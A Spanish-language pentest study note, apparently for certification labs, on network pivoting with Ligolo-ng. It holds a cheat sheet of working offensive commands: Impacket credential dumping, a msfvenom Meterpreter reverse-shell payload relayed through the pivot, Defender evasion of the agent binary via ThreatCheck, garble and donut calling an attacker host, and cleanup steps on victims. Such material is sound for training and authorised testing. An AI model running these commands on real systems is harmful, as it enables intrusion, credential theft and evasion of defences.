---
tags:
  - pivoting
  - lateralmovement
---
## Conceptos Clave (TL;DR)

- Como el trafico va por una interfaz real, ELIMINAS el prefijo proxychains en casi todas las herramientas y usas la IP interna directamente.
- DIFERENCIA CRITICA frente a proxychains: el DNS NO se resuelve solo por el tunel. Debes indicar el servidor DNS interno explicitamente (-ns <DC_IP>, /etc/resolv.conf o DNSChef).
- El binario agent.exe oficial es muy detectado por Defender (~15 motores en VirusTotal). Hay tecnicas de evasion (recompilar -s -w, ThreatCheck, garble, donut/in-memory), pero son de lab y caducan rapido.
- Regla de oro de troubleshooting: estabilidad -> interfaz -> rutas -> ruta de retorno -> MTU.

## Herramientas Clave

- nmap / NetExec (nxc) / smbclient / smbmap: enumeracion directa por IP interna.
- Impacket (psexec, secretsdump, wmiexec) / Evil-WinRM / xfreerdp3: ejecucion y acceso remoto directo.
- bloodhound-python / rpcclient / enum4linux / ldapsearch: recon de Active Directory (requieren -ns para DNS).
- DNSChef: proxy DNS falso para mapear registros del dominio cuando bloodhound-python falla por timeouts.
- msfvenom / Metasploit: payloads y handlers (LHOST = IP del pivote, handler en 0.0.0.0).
- garble / donut / ThreatCheck: ofuscacion y evasion AV-EDR del agent.exe en Windows.

## Metodologia Paso a Paso

1. Sustituir proxychains por acceso directo. Quita el prefijo y apunta a la IP interna; ajusta solo los flags de nmap (-PE / --unprivileged).
2. Reverse shells internos. Crea un listener en el agente que reenvie a tu handler; el payload usa LHOST = IP del pivote y el handler escucha en 0.0.0.0.
3. Resolver DNS de AD manualmente. Pasa -ns <DC_IP> a herramientas que resuelvan nombres, o anade el DC a resolv.conf, o usa DNSChef.
4. Pivoting desde Windows / evasion. Si Defender marca el agent.exe, recompila con -ldflags "-s -w"; si sigue marcando, parchea con ThreatCheck o usa donut/in-memory.
5. Diagnostico de fallos. Si conexiones pequenas funcionan pero las grandes cuelgan, sospecha MTU. Si una ruta no funciona, revisa solapamientos. Si el agente no conecta, comprueba alcanzabilidad y firewall.
6. Cleanup / OPSEC al terminar. Para listeners y tuneles, borra rutas e interfaces, mata el agente remoto y borra el binario en la victima.

## Cheat Sheet de Comandos

```bash
# --- NMAP (sin proxychains) ---
# -Pn sin host discovery, --unprivileged fuerza connect scan (el agente no envia raw)
nmap -Pn --unprivileged <TARGET_IP>
# -sV deteccion de version; -sU UDP funciona pero lento
```

```bash
# --- SMB: NetExec / smbclient (directo por IP) ---
nxc smb <TARGET_IP> -u <USER> -p <PASSWORD>
smbclient -L //<TARGET_IP>/
```

```bash
# --- IMPACKET (directo por IP) ---
impacket-psexec <USER>:<PASSWORD>@<TARGET_IP>
secretsdump.py <USER>:<PASSWORD>@<TARGET_IP>
wmiexec.py <USER>:<PASSWORD>@<TARGET_IP>
```

```bash
# --- EVIL-WINRM ---
# -i IP objetivo, -u usuario, -p password
evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>
```

```bash
# --- RDP directo (sustituye al proxychains xfreerdp) ---
# /v destino, /u usuario, /p password (comillas si tiene caracteres especiales)
xfreerdp3 /v:<TARGET_IP> /u:<USER> /p:'<PASSWORD>'
```

```bash
# --- ACTIVE DIRECTORY: recon (OJO con DNS, ver -ns) ---
# bloodhound-python: -c All recoge todo, -ns fuerza el DNS al DC, -dc FQDN del DC
bloodhound-python -c All -d <DOMAIN> -u <USER> -p <PASSWORD> -ns <DC_IP> -dc <DC_FQDN>

rpcclient -U <USER> <TARGET_IP>
enum4linux <TARGET_IP>
ldapsearch -H ldap://<TARGET_IP>
```

```bash
# --- METASPLOIT: reverse shell interno via listener ---
# Listener en el agente: reenvia 1234 hacia tu handler local en 4444
[Agent : <USER>@<HOST>] » listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444

# Payload: LHOST = IP DEL PIVOTE, LPORT = puerto del listener del agente
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<PIVOT_IP> LPORT=1234 -f exe -o s.exe

# En msfconsole el handler escucha en 0.0.0.0
# set LHOST 0.0.0.0 ; set LPORT 4444
```

```bash
# --- DNS interno manual (clave en AD) ---
# Resolver un host usando el DC como servidor DNS
nslookup <HOSTNAME> <DC_IP>
# Alternativas: anadir el DC a /etc/resolv.conf o levantar DNSChef como DNS falso
```

```bash
# --- WINDOWS: evasion del agent.exe ---
# Recompilar sin simbolos: -s elimina tabla de simbolos, -w elimina info DWARF
GOOS=windows go build -ldflags "-s -w" -o agent2.exe cmd/agent/main.go

# Ofuscacion con garble (fuente terciaria, verificar antes de confiar)
GOOS=windows GOARCH=amd64 garble -literals -tiny build -o agent.exe ./cmd/agent

# Ejecucion en memoria con donut (-f 1 formato, -a 2 amd64, -p parametros, -i input)
donut -f 1 -o agent.bin -a 2 -p "-connect <ATTACKER_IP>:11601 -ignore-cert" -i agent.exe
```

```bash
# --- WINDOWS: modo bind (agente como servidor, sin salida hacia el atacante) ---
# En la victima el agente escucha
agent.exe -bind 0.0.0.0:11601
# Desde el proxy te conectas tu hacia el agente (valida su fingerprint)
ligolo-ng » connect_agent --ip <VICTIM_IP>:11601
```

```bash
# --- TROUBLESHOOTING: MTU / fragmentacion ---
# -M do prohibe fragmentar, -s fija tamano; baja el valor hasta que pase
ping -M do -s 1472 <TARGET_IP>
```

```bash
# --- TROUBLESHOOTING: rutas conflictivas ---
ip route show
ligolo-ng » route_list
sudo ip route del <SUBNET> dev <IFACE>
ligolo-ng » route_delete --name <IFACE> --route <SUBNET>
ip link show ligolo   # verificar que la TUN esta UP
```

```bash
# --- TROUBLESHOOTING: el agente no conecta ---
telnet <ATTACKER_IP> 11601   # comprobar alcanzabilidad del proxy
iptables -L -n               # revisar firewall local
# Lanzar agente/proxy con -v (verbose) y -retry / -reconnect
# Si el firewall bloquea 11601: proxy en 443 o WebSocket
./proxy -selfcert -laddr 0.0.0.0:443
./proxy -selfcert -laddr https://0.0.0.0:443   # + agente con -proxy
```

```bash
# --- CLEANUP / OPSEC al terminar ---
# En la consola del proxy
[Agent] » listener_stop <id>
[Agent] » tunnel_stop
ligolo-ng » route_delete --name ligolo --route <INTERNAL_SUBNET>
ligolo-ng » interface_delete --name ligolo
ligolo-ng » kill          # termina el agente remoto y limpia rutas stale

# En Kali (si se crearon a mano)
sudo ip route del <INTERNAL_SUBNET> dev ligolo
sudo ip link set ligolo down
sudo ip link del ligolo   # o: sudo ip tuntap del mode tun ligolo

# En la victima: matar el proceso agent y borrar el binario
```

## "Gotchas" y Troubleshooting

- DNS es el cambio operativo mas importante respecto a proxychains: Ligolo NO proxea el DNS. Sin -ns <DC_IP> (o resolv.conf/DNSChef) las herramientas de AD fallan por timeouts LDAP/SRV con sufijos DNS distintos.
- Hydra y fuerza bruta: directos por IP, pero baja el paralelismo por el bloqueo de conexiones TCP masivas (Issue #14).
- Burp/curl/wget: acceso directo a webs internas por IP; la TUN enruta el trafico, no hace falta configurar SOCKS upstream.
- Defender detecta el agent.exe oficial. Walkowski reporta que -s -w por si solo NO basto contra Microsoft: tuvo que parchear con ThreatCheck los bytes de la cadena "client finished" (10 bytes en offset 0x5B07D8 a 0xFF) hasta "No Threat found!".
- donut/in-memory puede NO funcionar en Windows 11 totalmente parcheado segun la fuente original. Trata la evasion como tecnica de lab/OSEP, no como garantia.
- garble proviene de blogs de terceros: verifica antes de confiar. -s -w + ThreatCheck y donut si estan documentados en blogs primarios.
- MTU: si conexiones pequenas van pero las grandes cuelgan, ajusta el MTU de la interfaz ligolo.
- Recordatorio CPTS: el material oficial sigue basado en proxychains/SSH/chisel/Metasploit. Conoce ambos enfoques; usa Ligolo como motor principal y manten proxychains + autoroute como respaldo cuando no puedas crear la TUN (sin root en Kali/Pwnbox) o un binario solo hable SOCKS.